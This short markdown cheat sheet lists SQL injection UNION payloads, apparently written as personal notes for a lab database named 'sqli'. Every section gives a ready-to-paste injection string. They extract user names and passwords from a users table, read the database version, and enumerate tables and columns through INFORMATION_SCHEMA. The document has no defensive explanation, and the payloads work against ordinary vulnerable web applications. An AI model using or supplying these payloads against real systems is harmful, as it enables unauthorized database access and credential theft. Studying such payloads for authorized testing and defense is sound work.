# SQLI UNION

```sql
UNION SELECT 1,name,3,password FROM users;
```

## Version and database

```sql
UNION SELECT 1,name,@@version,password FROM users;
```

## Tables
```sql
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='sqli'
```

## Columns

```sql
UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'
```# sqli
